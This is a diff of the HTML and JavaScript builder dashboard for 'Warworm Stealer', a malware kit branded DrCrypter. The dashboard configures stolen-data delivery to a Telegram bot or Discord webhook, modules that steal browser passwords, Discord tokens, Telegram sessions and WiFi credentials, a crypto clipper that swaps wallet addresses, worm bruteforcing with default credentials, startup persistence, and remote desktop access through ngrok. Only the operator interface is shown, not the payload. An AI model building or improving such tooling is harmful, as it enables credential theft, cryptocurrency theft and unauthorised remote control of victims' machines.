         ::-webkit-scrollbar-thumb:hover {
-            background: var(--text-secondary);
+            background: var(--border-light);
         }
 
-        /* Hidden file input */
-        input[type="file"] {
-            display: none;
+        .hidden {
+            display: none !important;
         }
     </style>
-<base target="_blank">
 </head>
 <body>
     <div class="container">
         <header>
-            <div class="logo">
-                <div class="logo-icon">🛡️</div>
-                <div>
-                    <h1 class="logo-text">Warworm Stealer v1.0.0</h1>
-                    <p style="color: var(--text-secondary); font-family: monospace; font-size: 0.85rem;">Developed by DRCrypter.ru</p>
+            <div class="brand">
+                <!-- <div class="brand-icon">🛡️</div> -->
+                <a href="https://drcrypter.net" target="_blank" class="logo" style="display: flex; margin: 0 auto 2rem auto; width: 100px; height: 100px; align-items: center; justify-content: center; overflow: hidden; text-decoration: none; background: transparent; box-shadow: none;">
+                    <img src="https://drcrypter.net/data/assets/logo/logo1.png" alt="DrCrypter" style="width: 100%; height: 100%; object-fit: contain; border-radius: 20px;">
+                </a>
+                <div class="brand-text">
+                    <h1>Warworm Builder</h1>
+                    <p>Secure Build Dashboard v1.3.0</p>
                 </div>
             </div>
-            <div style="text-align: center;">
-                <div style="font-size: 1.5rem; font-weight: 700; color: var(--primary);" id="activeModules">0</div>
-                <div style="font-size: 0.75rem; color: var(--text-secondary);">Active Modules</div>
+            <div class="header-actions">
+                <button class="btn btn-secondary btn-icon" onclick="location.reload()" title="Refresh">🔄</button>
+                <button class="btn btn-primary" onclick="saveConfiguration()">
+                    <span>💾</span>
+                    <span>Save Config</span>
+                </button>
             </div>
         </header>
 
         <div class="nav-tabs">
-            <button class="nav-tab active" onclick="switchTab('dashboard')">📊 Dashboard</button>
-            <button class="nav-tab" onclick="switchTab('builder')">🔨 Builder</button>
+            <button class="nav-tab active" onclick="switchTab('dashboard')">📊 Modules</button>
+            <button class="nav-tab" onclick="switchTab('builder')">🔨 Build</button>
         </div>
 
         <div class="dashboard-grid">
             <div class="sidebar">
                 <div class="panel">
-                    <div class="panel-header">⚙️ Build Settings</div>
+                    <div class="panel-header">
+                        <div class="panel-header-icon">⚙️</div>
+                        <span>Build Settings</span>
+                    </div>
+                    
                     <div class="toggle-row">
-                        <span>One File</span>
+                        <span class="toggle-label">One File</span>
                         <div class="toggle-switch active" id="toggle-onefile" onclick="toggleSetting(this, 'onefile')"></div>
                     </div>
+                    
                     <div class="toggle-row">
-                        <span>No Console</span>
+                        <span class="toggle-label">No Console</span>
                         <div class="toggle-switch active" id="toggle-noconsole" onclick="toggleSetting(this, 'noconsole')"></div>
                     </div>
+                    
                     <div class="toggle-row">
-                        <span>Clean Build</span>
+                        <span class="toggle-label">Clean Build</span>
                         <div class="toggle-switch active" id="toggle-clean" onclick="toggleSetting(this, 'clean')"></div>
                     </div>
+                    
                     <div class="toggle-row">
-                        <span>UPX Compress</span>
+                        <span class="toggle-label">UPX Compress</span>
                         <div class="toggle-switch" id="toggle-upx" onclick="toggleSetting(this, 'upx')"></div>
                     </div>
-                    <!-- Debug Mode toggle added -->
+                    
                     <div class="toggle-row">
-                        <span>Debug Mode</span>
+                        <span class="toggle-label">Debug Mode</span>
                         <div class="toggle-switch" id="toggle-debug" onclick="toggleSetting(this, 'debug')"></div>
                     </div>
-                    <div id="upxStatus" style="display: none; margin-top: 0.75rem; padding: 0.75rem; background: rgba(0, 255, 136, 0.1); border-radius: 8px; font-size: 0.8rem; color: var(--success); border: 1px solid rgba(0, 255, 136, 0.3);">
-                        ✓ UPX enabled (place upx.exe in project/upx/ folder)
+
+                    <div id="upxStatus" class="hidden info-badge">
+                        <span>ℹ️</span>
+                        <span>Place upx.exe in project/upx/ folder</span>
                     </div>
-                    <div id="debugStatus" style="display: none; margin-top: 0.75rem; padding: 0.75rem; background: rgba(0, 240, 255, 0.1); border-radius: 8px; font-size: 0.8rem; color: var(--primary); border: 1px solid rgba(0, 240, 255, 0.3);">
-                        ✓ Debug mode enabled – console will pause at end.
+                    
+                    <div id="debugStatus" class="hidden info-badge">
+                        <span>🐛</span>
+                        <span>Console will pause at end</span>
                     </div>
                 </div>
 
                 <div class="panel">
-                    <div class="panel-header">📤 Delivery</div>
-                    <div style="margin-bottom: 1rem;">
+                    <div class="panel-header">
+                        <div class="panel-header-icon">📤</div>
+                        <span>Delivery</span>
+                    </div>
+                    
+                    <div class="form-group">
                         <label class="form-label">Telegram Bot Token</label>
-                        <input type="password" id="telegramToken" placeholder="123456789:ABC..." onchange="updateConfig('telegram_token', this.value)">
+                        <input type="password" class="form-input" id="telegramToken" placeholder="123456789:ABC..." onchange="updateConfig('telegram_token', this.value)">
                     </div>
-                    <div style="margin-bottom: 1rem;">
+                    
+                    <div class="form-group">
                         <label class="form-label">Telegram Chat ID</label>
-                        <input type="text" id="telegramChatId" placeholder="123456789" onchange="updateConfig('telegram_chat_id', this.value)">
+                        <input type="text" class="form-input" id="telegramChatId" placeholder="123456789" onchange="updateConfig('telegram_chat_id', this.value)">
                     </div>
-                    <div>
+                    
+                    <div class="form-group">
                         <label class="form-label">Discord Webhook</label>
-                        <input type="text" id="discordWebhook" placeholder="https://discord.com/api/webhooks/..." onchange="updateConfig('discord_webhook', this.value)">
+                        <input type="text" class="form-input" id="discordWebhook" placeholder="https://discord.com/api/webhooks/..." onchange="updateConfig('discord_webhook', this.value)">
+                    </div>
+                </div>
+
+                <div class="panel">
+                    <div class="panel-header">
+                        <div class="panel-header-icon">🌐</div>
+                        <span>Ngrok Tunnel</span>
+                    </div>
+                    
+                    <div class="form-group">
+                        <label class="form-label">Auth Token</label>
+                        <input type="password" class="form-input" id="ngrokToken" placeholder="Token Ngrok" onchange="updateConfig('ngrok_token', this.value)">
+                    </div>
+                    
+                    <div class="info-badge">
+                        <span>🔒</span>
+                        <span>Required for RMM Remote Access</span>
                     </div>
                 </div>
             </div>
@@ -718,65 +929,116 @@
             <div class="main-content">
                 <div id="tab-dashboard" class="content-panel">
                     <div class="section-header">
-                        <h2 class="section-title">📦 Select Modules</h2>
-                        <button class="btn btn-secondary" onclick="selectAllModules()">Enable All</button>
+                        <h2 class="section-title">
+                            <span>📦</span>
+                            <span>Select Modules</span>
+                        </h2>
+                        <button class="btn btn-secondary btn-sm" onclick="selectAllModules()">Enable All</button>
                     </div>
 
-                    <!-- MODULES GRID -->
                     <div class="modules-grid">
-
                         <!-- DATA COLLECTION MODULE -->
                         <div class="module-card enabled" id="module-data" data-module="data">
                             <div class="module-header" onclick="toggleModule('data')">
                                 <div class="module-icon">📊</div>
                                 <div class="module-title">
                                     <h3>Data Collection</h3>
-                                    <p>System info, passwords, screenshots</p>
+                                    <p>System info, passwords, screenshots, processes</p>
                                 </div>
                                 <div class="toggle-switch module-toggle active" id="toggle-data"></div>
                             </div>
                             <div class="feature-list">
                                 <div class="feature-item selected" data-feature="system_info" onclick="toggleFeature(event, 'system_info')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">System Information</div>
                                         <div class="feature-desc">Hardware, OS, network details</div>
                                     </div>
                                 </div>
                                 <div class="feature-item selected" data-feature="screenshot" onclick="toggleFeature(event, 'screenshot')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">Screenshot Capture</div>
                                         <div class="feature-desc">Real-time desktop capture</div>
                                     </div>
                                 </div>
                                 <div class="feature-item selected" data-feature="browser_passwords" onclick="toggleFeature(event, 'browser_passwords')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">Browser Passwords</div>
                                         <div class="feature-desc">Chrome, Firefox, Edge, etc.</div>
+                                    </div>
+                                </div>
+                                <div class="feature-item selected" data-feature="process_manager" onclick="toggleFeature(event, 'process_manager')">
+                                    <div class="feature-checkbox"></div>
+                                    <div class="feature-info">
+                                        <div class="feature-name">Process Manager</div>
+                                        <div class="feature-desc">Collect all running processes</div>
                                     </div>
                                 </div>
                             </div>
                         </div>
 
-
-                        <!-- PROCESS MANAGER MODULE -->
-                        <div class="module-card" id="module-process" data-module="process">
-                            <div class="module-header" onclick="toggleModule('process')">
-                                <div class="module-icon" style="background: rgba(0, 102, 255, 0.2); color: var(--info);">⚙️</div>
+                        <!-- RMM MODULE (Unified) -->
+                        <div class="module-card" id="module-rmm" data-module="rmm">
+                            <div class="module-header" onclick="toggleModule('rmm')">
+                                <div class="module-icon" style="background: rgba(124, 58, 237, 0.15); color: #a78bfa;">🖥️</div>
                                 <div class="module-title">
-                                    <h3>Process Manager</h3>
-                                    <p>Collect all running processes</p>
+                                    <h3>Remote Management</h3>
+                                    <p>Remote Desktop & File Manager Port</p>
                                 </div>
-                                <div class="toggle-switch module-toggle" id="toggle-process"></div>
+                                <div class="toggle-switch module-toggle" id="toggle-rmm"></div>
                             </div>
                             <div class="feature-list">
-                                <div class="feature-item" data-feature="process_manager" onclick="toggleFeature(event, 'process_manager')">
+                                <div class="feature-item" data-feature="remote_desktop" onclick="toggleFeature(event, 'remote_desktop')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
-                                        <div class="feature-name">Collect All Processes</div>
-                                        <div class="feature-desc">System & user processes with details</div>
+                                    <div class="feature-info">
+                                        <div class="feature-name">Remote Desktop</div>
+                                        <div class="feature-desc">Real-time screen streaming</div>
+                                    </div>
+                                </div>
+                                <div class="feature-item" data-feature="file_manager" onclick="toggleFeature(event, 'file_manager')">
+                                    <div class="feature-checkbox"></div>
+                                    <div class="feature-info">
+                                        <div class="feature-name">File Manager</div>
+                                        <div class="feature-desc">Web-based file browser</div>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Unified RMM Configuration -->
+                            <div class="sub-config" id="config-rmm">
+                                <div class="sub-config-title">
+                                    <span>🔐</span>
+                                    <span>Unified Access Configuration</span>
+                                </div>
+
+                                <div class="info-badge" style="margin-bottom: 1rem; width: 100%;">
+                                    <span>⚠️</span>
+                                    <span>Single port & password for both services</span>
+                                </div>
+
+                                <div class="rmm-config-grid">
+                                    <div class="form-group">
+                                        <label class="form-label">Master Password</label>
+                                        <div class="input-group">
+                                            <input type="text" class="form-input" id="rmmPassword" placeholder="Click random to generate" onchange="updateConfig('remote_access_password', this.value)" style="flex: 1;">
+                                            <button class="btn btn-secondary btn-icon" onclick="generateSecurePassword()" title="Generate Random Password">🎲</button>
+                                        </div>
+                                        <div class="password-strength">
+                                            <div class="password-strength-bar" id="passwordStrength"></div>
+                                        </div>
+                                    </div>
+
+                                    <div class="form-group">
+                                        <label class="form-label">RMM Port</label>
+                                        <div class="port-config">
+                                            <input type="number" class="form-input" id="rmmPort" value="5000" min="1024" max="65535" onchange="updateConfig('rmm_port', parseInt(this.value))">
+                                            <button class="btn btn-secondary" onclick="generateRandomPort()" title="Generate Random Port">
+                                                <span>🎲</span>
+                                                <span>Random</span>
+                                            </button>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
@@ -795,14 +1057,14 @@
                             <div class="feature-list">
                                 <div class="feature-item" data-feature="discord_token" onclick="toggleFeature(event, 'discord_token')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">Discord Tokens</div>
                                         <div class="feature-desc">Extract tokens & account info</div>
                                     </div>
                                 </div>
                                 <div class="feature-item" data-feature="telegram_session" onclick="toggleFeature(event, 'telegram_session')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">Telegram Session</div>
                                         <div class="feature-desc">Steal session files</div>
                                     </div>
@@ -815,22 +1077,22 @@
                             <div class="module-header" onclick="toggleModule('network')">
                                 <div class="module-icon">🌐</div>
                                 <div class="module-title">
-                                    <h3>Worm & Network</h3>
-                                    <p>Scanner, Worm Network (Bruteforce), WiFi</p>
+                                    <h3>Network & Worm</h3>
+                                    <p>Scanner, Bruteforce, WiFi</p>
                                 </div>
                                 <div class="toggle-switch module-toggle" id="toggle-network"></div>
                             </div>
                             <div class="feature-list">
                                 <div class="feature-item" data-feature="network_scan" onclick="toggleFeature(event, 'network_scan')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">Network Scanner</div>
                                         <div class="feature-desc">Port scanning & host discovery</div>
                                     </div>
                                 </div>
                                 <div class="feature-item" data-feature="wifi_passwords" onclick="toggleFeature(event, 'wifi_passwords')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">WiFi Passwords</div>
                                         <div class="feature-desc">Extract saved WiFi credentials</div>
                                     </div>
@@ -839,24 +1101,27 @@
 
                             <!-- Network Sub-Configuration -->
                             <div class="sub-config" id="config-network">
-                                <div class="sub-config-title">⚙️ Scanner Configuration</div>
+                                <div class="sub-config-title">
+                                    <span>⚙️</span>
+                                    <span>Scanner Configuration</span>
+                                </div>
 
                                 <div class="form-group">
                                     <label class="form-label">Target Ports</label>
-                                    <div class="port-grid" id="portContainer">
+                                    <div style="display: flex; flex-wrap: wrap; gap: 0.5rem; margin-bottom: 0.75rem;" id="portContainer">
                                         <!-- Ports populated by JS -->
                                     </div>
-                                    <div class="port-input-group">
-                                        <input type="number" id="newPort" placeholder="Port..." min="1" max="65535">
-                                        <button class="btn-add" onclick="addPort()">+ Add</button>
+                                    <div class="input-group">
+                                        <input type="number" class="form-input" id="newPort" placeholder="Port..." min="1" max="65535" style="width: 100px;">
+                                        <button class="btn btn-primary btn-sm" onclick="addPort()">Add</button>
                                     </div>
                                 </div>
 
-                                <div class="feature-item" id="feature-auto_brute" style="margin-top: 1rem; padding: 0.75rem 0;" onclick="toggleSubFeature('auto_brute')">
+                                <div class="feature-item" id="feature-auto_brute" style="margin-top: 1rem; padding: 0.75rem;" onclick="toggleSubFeature('auto_brute')">
                                     <div class="feature-checkbox" id="checkbox-auto_brute"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">Worm Network (Bruteforce)</div>
-                                        <div class="feature-desc">Attempt default credentials on discovered services</div>
+                                        <div class="feature-desc">Attempt default credentials</div>
                                     </div>
                                 </div>
                             </div>
@@ -865,7 +1130,7 @@
                         <!-- CRYPTO CLIPPER MODULE -->
                         <div class="module-card" id="module-crypto" data-module="crypto">
                             <div class="module-header" onclick="toggleModule('crypto')">
-                                <div class="module-icon" style="background: rgba(247, 147, 26, 0.2); color: var(--crypto);">₿</div>
+                                <div class="module-icon" style="background: rgba(245, 158, 11, 0.15); color: #fbbf24;">₿</div>
                                 <div class="module-title">
                                     <h3>Crypto Clipper</h3>
                                     <p>Clipboard address replacement</p>
@@ -875,7 +1140,7 @@
                             <div class="feature-list">
                                 <div class="feature-item" data-feature="crypto_clipper" onclick="toggleFeature(event, 'crypto_clipper')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">Enable Clipper</div>
                                         <div class="feature-desc">Run as independent process</div>
                                     </div>
@@ -884,26 +1149,29 @@
 
                             <!-- Crypto Sub-Configuration -->
                             <div class="sub-config" id="config-crypto">
-                                <div class="sub-config-title" style="color: var(--crypto);">💰 Your Addresses</div>
+                                <div class="sub-config-title" style="color: #fbbf24;">
+                                    <span>💰</span>
+                                    <span>Your Addresses</span>
+                                </div>
+                                
                                 <div class="form-group">
                                     <label class="form-label">Bitcoin (BTC)</label>
-                                    <input type="text" id="btcAddress" placeholder="bc1q..." onchange="updateCrypto('Bitcoin', this.value)">
+                                    <input type="text" class="form-input" id="btcAddress" placeholder="bc1q..." onchange="updateCrypto('Bitcoin', this.value)">
                                 </div>
+                                
                                 <div class="form-group">
                                     <label class="form-label">Ethereum (ETH)</label>
-                                    <input type="text" id="ethAddress" placeholder="0x..." onchange="updateCrypto('Ethereum', this.value)">
+                                    <input type="text" class="form-input" id="ethAddress" placeholder="0x..." onchange="updateCrypto('Ethereum', this.value)">
                                 </div>
+                                
                                 <div class="form-group">
                                     <label class="form-label">Litecoin (LTC)</label>
-                                    <input type="text" id="ltcAddress" placeholder="L..." onchange="updateCrypto('Litecoin', this.value)">
+                                    <input type="text" class="form-input" id="ltcAddress" placeholder="L..." onchange="updateCrypto('Litecoin', this.value)">
                                 </div>
+                                
                                 <div class="form-group">
                                     <label class="form-label">Monero (XMR)</label>
-                                    <input type="text" id="xmrAddress" placeholder="4..." onchange="updateCrypto('Monero', this.value)">
-                                </div>
-                                <div class="form-group">
-                                    <label class="form-label">Dogecoin (DOGE)</label>
-                                    <input type="text" id="dogeAddress" placeholder="D..." onchange="updateCrypto('Dogecoin', this.value)">
+                                    <input type="text" class="form-input" id="xmrAddress" placeholder="4..." onchange="updateCrypto('Monero', this.value)">
                                 </div>
                             </div>
                         </div>
@@ -911,7 +1179,7 @@
                         <!-- PERSISTENCE MODULE -->
                         <div class="module-card" id="module-persistence" data-module="persistence">
                             <div class="module-header" onclick="toggleModule('persistence')">
-                                <div class="module-icon" style="background: rgba(255, 71, 87, 0.2); color: var(--danger);">♻️</div>
+                                <div class="module-icon" style="background: rgba(239, 68, 68, 0.15); color: #f87171;">♻️</div>
                                 <div class="module-title">
                                     <h3>Persistence</h3>
                                     <p>Auto-startup installation</p>
@@ -921,41 +1189,43 @@
                             <div class="feature-list">
                                 <div class="feature-item" data-feature="persistence" onclick="toggleFeature(event, 'persistence')">
                                     <div class="feature-checkbox"></div>
-                                    <div>
+                                    <div class="feature-info">
                                         <div class="feature-name">Enable Persistence</div>
-                                        <div class="feature-desc">Install to Windows startup registry</div>
+                                        <div class="feature-desc">Install to Windows startup</div>
                                     </div>
                                 </div>
                             </div>
                         </div>
-
                     </div>
 
-                    <!-- BROWSER SELECTION WITH ICONS -->
-                    <div class="section-header" style="margin-top: 2rem;">
-                        <h2 class="section-title">
-                            <div class="section-icon">🌐</div>
-                            Target Browsers
-                        </h2>
-                        <button class="btn btn-secondary" onclick="toggleAllBrowsers()">OFF/ON</button>
-                    </div>
-                    <div class="browser-grid" id="browserGrid">
-                        <!-- Browsers populated by JS -->
+                    <!-- Browser Selection -->
+                    <div class="browser-section">
+                        <div class="section-header">
+                            <h2 class="section-title">
+                                <span>🌐</span>
+                                <span>Target Browsers</span>
+                            </h2>
+                            <button class="btn btn-secondary btn-sm" onclick="toggleAllBrowsers()">Toggle All</button>
+                        </div>
+                        <div class="browser-grid" id="browserGrid">
+                            <!-- Browsers populated by JS -->
+                        </div>
                     </div>
                 </div>
 
-                <div id="tab-builder" class="content-panel" style="display: none;">
+                <div id="tab-builder" class="content-panel hidden">
                     <div class="build-section">
                         <div class="build-icon">📦</div>
-                        <h2 style="font-size: 1.8rem; margin-bottom: 0.5rem;">Ready to Build</h2>
-                        <p style="color: var(--text-secondary); margin-bottom: 2rem;">Review your configuration</p>
+                        <h2 style="font-size: 1.5rem; margin-bottom: 0.5rem; color: var(--text-primary);">Ready to Build</h2>
+                        <p style="color: var(--text-secondary); margin-bottom: 2rem; font-size: 0.875rem;">Review your configuration before compiling</p>
 
                         <div class="build-preview" id="buildPreview">
                             <!-- Populated by JS -->
                         </div>
 
-                        <button class="btn btn-primary" onclick="build()" id="buildBtn" style="font-size: 1.1rem; padding: 1rem 3rem;">
-                            ⬇️ Build & Download
+                        <button class="btn btn-primary" onclick="build()" id="buildBtn" style="font-size: 1rem; padding: 1rem 2.5rem;">
+                            <span>⬇️</span>
+                            <span>Build & Download</span>
                         </button>
                     </div>
                 </div>
@@ -966,9 +1236,9 @@
     <div class="toast-container" id="toastContainer"></div>
 
     <script>
-        // Default configuration matching config_db.json structure
+        // Default configuration with unified port
         let config = {
-            version: "3.0",
+            version: "3.1",
             last_updated: new Date().toISOString(),
             pyinstaller_settings: {
                 onefile: true,
@@ -983,9 +1253,12 @@
                 discord_webhook: ""
             },
             features: {
-                system_info: true,
-                screenshot: true,
-                browser_passwords: true,
+                process_manager: false,
+                remote_desktop: false,
+                file_manager: false,
+                system_info: false,
+                screenshot: false,
+                browser_passwords: false,
                 discord_token: false,
                 telegram_session: false,
                 network_scan: false,
@@ -1013,7 +1286,11 @@
                 telnet: false,
                 smb: false,
                 rdp: false
-            }
+            },
+            ngrok_token: "",
+            // Unified configuration
+            remote_access_password: "",
+            rmm_port: 5000
         };
 
         // Browser icons mapping
@@ -1030,12 +1307,12 @@
 
         // Module definitions
         const modules = {
-            data: ['system_info', 'screenshot', 'browser_passwords'],
+            data: ['system_info', 'screenshot', 'browser_passwords', 'process_manager'],
             messaging: ['discord_token', 'telegram_session'],
             network: ['network_scan', 'wifi_passwords'],
             crypto: ['crypto_clipper'],
             persistence: ['persistence'],
-            process: ['process_manager']  
+            rmm: ['remote_desktop', 'file_manager']
         };
 
         // Initialize dashboard
@@ -1043,22 +1320,71 @@
             renderBrowsers();
             renderPorts();
             
-            // Try loading from config_db.json first, then fallback to localStorage
+            console.log('[DASHBOARD] Loading configuration...');
+            
             const loadedFromServer = await loadFromConfigDB();
             if (!loadedFromServer) {
+                console.log('[DASHBOARD] Falling back to localStorage');
                 loadFromLocalStorage();
             }
             
             updateAllUI();
-            updateModuleCount();
+            console.log('[DASHBOARD] Initialization complete');
+        }
+
+        // Generate random port between 10000-65535
+        function generateRandomPort() {
+            const min = 10000;
+            const max = 65535;
+            const randomPort = Math.floor(Math.random() * (max - min + 1)) + min;
+            
+            document.getElementById('rmmPort').value = randomPort;
+            updateConfig('rmm_port', randomPort);
+            showToast(`Random port generated: ${randomPort}`, 'info');
+        }
+
+        // Generate secure password
+        function generateSecurePassword() {
+            const length = 16;
+            const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*";
+            let password = "";
+            const cryptoObj = window.crypto || window.msCrypto;
+            
+            if (cryptoObj && cryptoObj.getRandomValues) {
+                const randomValues = new Uint32Array(length);
+                cryptoObj.getRandomValues(randomValues);
+                for (let i = 0; i < length; i++) {
+                    password += charset[randomValues[i] % charset.length];
+                }
+            } else {
+                for (let i = 0; i < length; i++) {
+                    password += charset.charAt(Math.floor(Math.random() * charset.length));
+                }
+            }
+            
+            document.getElementById('rmmPassword').value = password;
+            updateConfig('remote_access_password', password);
+            
+            // Update strength bar
+            const strengthBar = document.getElementById('passwordStrength');
+            strengthBar.className = 'password-strength-bar strong';
+            
+            showToast('Secure 16-char password generated!', 'success');
+            
+            // Reset strength bar after 3 seconds
+            setTimeout(() => {
+                strengthBar.className = 'password-strength-bar';
+            }, 3000);
         }
 
         // Switch tabs
         function switchTab(tab) {
             document.querySelectorAll('.nav-tab').forEach(t => t.classList.remove('active'));
             event.target.classList.add('active');
-            document.getElementById('tab-dashboard').style.display = tab === 'dashboard' ? 'block' : 'none';
-            document.getElementById('tab-builder').style.display = tab === 'builder' ? 'block' : 'none';
+            
+            document.getElementById('tab-dashboard').classList.toggle('hidden', tab !== 'dashboard');
+            document.getElementById('tab-builder').classList.toggle('hidden', tab !== 'builder');
+            
             if (tab === 'builder') updateBuildPreview();
         }
 
@@ -1067,23 +1393,26 @@
             const features = modules[moduleId];
             const anyEnabled = features.some(f => config.features[f]);
             const newState = !anyEnabled;
-
+            
             features.forEach(feature => {
                 config.features[feature] = newState;
             });
-
+            
             updateModuleUI(moduleId);
             updateModuleCardState(moduleId);
-
+            
+            // Handle sub-config visibility
             if (moduleId === 'network') {
                 document.getElementById('config-network').classList.toggle('active', newState);
             }
             if (moduleId === 'crypto') {
                 document.getElementById('config-crypto').classList.toggle('active', newState);
             }
-
-            showToast(`${moduleId} module ${newState ? 'enabled' : 'disabled'}`);
-            updateModuleCount();
+            if (moduleId === 'rmm') {
+                document.getElementById('config-rmm').classList.toggle('active', newState);
+            }
+            
+            showToast(`${moduleId} module ${newState ? 'enabled' : 'disabled'}`, newState ? 'success' : 'info');
             autoSave();
         }
 
@@ -1091,7 +1420,8 @@
         function toggleFeature(event, feature) {
             event.stopPropagation();
             config.features[feature] = !config.features[feature];
-
+            
+            // Find module
             let moduleId = null;
             for (const [mod, feats] of Object.entries(modules)) {
                 if (feats.includes(feature)) {
@@ -1099,25 +1429,28 @@
                     break;
                 }
             }
-
+            
             if (moduleId) {
                 updateModuleUI(moduleId);
                 updateModuleCardState(moduleId);
             }
-
+            
+            // Handle sub-configs
             if (feature === 'network_scan') {
                 document.getElementById('config-network').classList.toggle('active', config.features[feature]);
             }
             if (feature === 'crypto_clipper') {
                 document.getElementById('config-crypto').classList.toggle('active', config.features[feature]);
             }
-
+            if (feature === 'remote_desktop' || feature === 'file_manager') {
+                const showConfig = config.features.remote_desktop || config.features.file_manager;
+                document.getElementById('config-rmm').classList.toggle('active', showConfig);
+            }
+            
             showToast(feature.replace('_', ' ') + ' ' + (config.features[feature] ? 'enabled' : 'disabled'));
-            updateModuleCount();
             autoSave();
         }
 
-        // Toggle sub-feature
         function toggleSubFeature(feature) {
             config.features[feature] = !config.features[feature];
             const checkbox = document.getElementById(`checkbox-${feature}`);
@@ -1132,27 +1465,24 @@
             }
             
             showToast(feature.replace('_', ' ') + ' ' + (config.features[feature] ? 'enabled' : 'disabled'));
-            updateModuleCount();
             autoSave();
         }
 
-        // Update module UI
         function updateModuleUI(moduleId) {
             const moduleCard = document.getElementById(`module-${moduleId}`);
             const features = modules[moduleId];
-
+            
             features.forEach(feature => {
                 const featureEl = moduleCard.querySelector(`[data-feature="${feature}"]`);
                 if (featureEl) {
                     featureEl.classList.toggle('selected', config.features[feature]);
                 }
             });
-
+            
             const anyEnabled = features.some(f => config.features[f]);
             document.getElementById(`toggle-${moduleId}`).classList.toggle('active', anyEnabled);
         }
 
-        // Update module card state
         function updateModuleCardState(moduleId) {
             const moduleCard = document.getElementById(`module-${moduleId}`);
             const features = modules[moduleId];
@@ -1160,31 +1490,22 @@
             moduleCard.classList.toggle('enabled', anyEnabled);
         }
 
-        // Toggle setting
         function toggleSetting(el, setting) {
             el.classList.toggle('active');
             const isActive = el.classList.contains('active');
             config.pyinstaller_settings[setting] = isActive;
-
+            
             if (setting === 'upx') {
-                const statusDiv = document.getElementById('upxStatus');
-                statusDiv.style.display = isActive ? 'block' : 'none';
-                if (isActive) {
-                    showToast('UPX enabled - ensure upx.exe exists in root/upx/', 'info');
-                }
+                document.getElementById('upxStatus').classList.toggle('hidden', !isActive);
             }
             if (setting === 'debug') {
-                const statusDiv = document.getElementById('debugStatus');
-                statusDiv.style.display = isActive ? 'block' : 'none';
-                if (isActive) {
-                    showToast('Debug mode enabled – console will pause at end', 'info');
-                }
+                document.getElementById('debugStatus').classList.toggle('hidden', !isActive);
             }
+            
             showToast(setting.replace('_', ' ') + ' ' + (isActive ? 'enabled' : 'disabled'));
             autoSave();
         }
 
-        // Select all modules
         function selectAllModules() {
             Object.keys(config.features).forEach(f => config.features[f] = true);
             Object.keys(modules).forEach(mod => {
@@ -1193,25 +1514,26 @@
             });
             document.getElementById('config-network').classList.add('active');
             document.getElementById('config-crypto').classList.add('active');
-            showToast('All modules enabled');
-            updateModuleCount();
+            document.getElementById('config-rmm').classList.add('active');
+            showToast('All modules enabled', 'success');
             autoSave();
         }
 
-        // Update config value
         function updateConfig(key, value) {
-            config.delivery[key] = value;
+            if (['telegram_token', 'telegram_chat_id', 'discord_webhook'].includes(key)) {
+                config.delivery[key] = value;
+            } else {
+                config[key] = value;
+            }
             autoSave();
         }
 
-        // Update crypto address
         function updateCrypto(coin, value) {
             config.crypto_addresses[coin] = value.trim();
             showToast(coin + ' address saved');
             autoSave();
         }
 
-        // Add port
         function addPort() {
             const input = document.getElementById('newPort');
             const port = parseInt(input.value);
@@ -1225,7 +1547,6 @@
             }
         }
 
-        // Remove port
         function removePort(port) {
             const idx = config.network_settings.ports.indexOf(port);
             if (idx > -1) {
@@ -1236,33 +1557,31 @@
             }
         }
 
-        // Render ports
         function renderPorts() {
             const container = document.getElementById('portContainer');
             container.innerHTML = config.network_settings.ports.map(port => 
-                `<div class="port-tag">${port} <button onclick="removePort(${port})">×</button></div>`
+                `<span style="display: inline-flex; align-items: center; gap: 0.25rem; padding: 0.25rem 0.5rem; background: var(--bg-card); border: 1px solid var(--border); border-radius: 4px; font-family: monospace; font-size: 0.75rem;">
+                    ${port} <button onclick="removePort(${port})" style="background: none; border: none; color: var(--danger); cursor: pointer; padding: 0; font-size: 1rem; line-height: 1;">×</button>
+                </span>`
             ).join('');
         }
 
-        // Render browsers with icons
         function renderBrowsers() {
             const container = document.getElementById('browserGrid');
             const allBrowsers = ["Chrome", "Edge", "Firefox", "Brave", "Opera", "Opera GX", "Vivaldi", "Yandex"];
-
+            
             container.innerHTML = allBrowsers.map(browser => {
                 const isSelected = config.browsers.includes(browser);
                 const icon = browserIcons[browser] || "🌐";
                 return `
-                    <label class="browser-item ${isSelected ? 'selected' : ''}" onclick="toggleBrowser('${browser}')">
-                        <input type="checkbox" class="browser-check" value="${browser}" ${isSelected ? 'checked' : ''}>
+                    <div class="browser-item ${isSelected ? 'selected' : ''}" onclick="toggleBrowser('${browser}')">
                         <div class="browser-icon">${icon}</div>
                         <span class="browser-name">${browser}</span>
-                    </label>
+                    </div>
                 `;
             }).join('');
         }
 
-        // Toggle browser
         function toggleBrowser(browser) {
             const idx = config.browsers.indexOf(browser);
             if (idx > -1) {
@@ -1275,76 +1594,75 @@
             autoSave();
         }
 
-        // Toggle all browsers
         function toggleAllBrowsers() {
             const allBrowsers = ["Chrome", "Edge", "Firefox", "Brave", "Opera", "Opera GX", "Vivaldi", "Yandex"];
             const allSelected = config.browsers.length === allBrowsers.length;
-
+            
             if (allSelected) {
                 config.browsers = [];
                 showToast('All browsers deselected');
             } else {
                 config.browsers = [...allBrowsers];
-                showToast('All browsers selected');
+                showToast('All browsers selected', 'success');
             }
             renderBrowsers();
             autoSave();
         }
 
-        // Update module count
-        function updateModuleCount() {
-            const count = Object.values(config.features).filter(v => v === true).length;
